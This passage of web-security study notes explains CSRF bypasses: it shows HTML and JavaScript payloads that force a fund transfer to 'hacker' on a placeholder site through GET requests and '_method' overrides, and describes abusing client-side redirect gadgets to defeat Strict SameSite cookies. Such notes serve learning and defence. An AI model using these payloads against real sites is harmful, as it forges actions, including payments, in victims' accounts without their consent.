If a server does not really care about whether it gets GET or POST requests, you can just do something like
```HTML
<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>
```

With some frameworks, the POST in the form method can be overriden by a \_method parameter.

```HTML
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
<input type="hidden" name="_method" value="GET"> 
<input type="hidden" name="recipient" value="hacker"> 
<input type="hidden" name="amount" value="1000000"> 
</form>
```
OR
```HTML
<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000&method=_post'; </script>
```
Other frameworks may have similar support.

# Same-Site Gadgets

Gadgets on the site may redirect to other sites, where the redirection target can be manipulated by the attacker. This can work on Strict.
However this only works if the redirects are client-side, not server-side.

So once you find something that redirects, if that redirect uses a controllable parameter, modify that to redirect to whichever site you want with parameters you want.
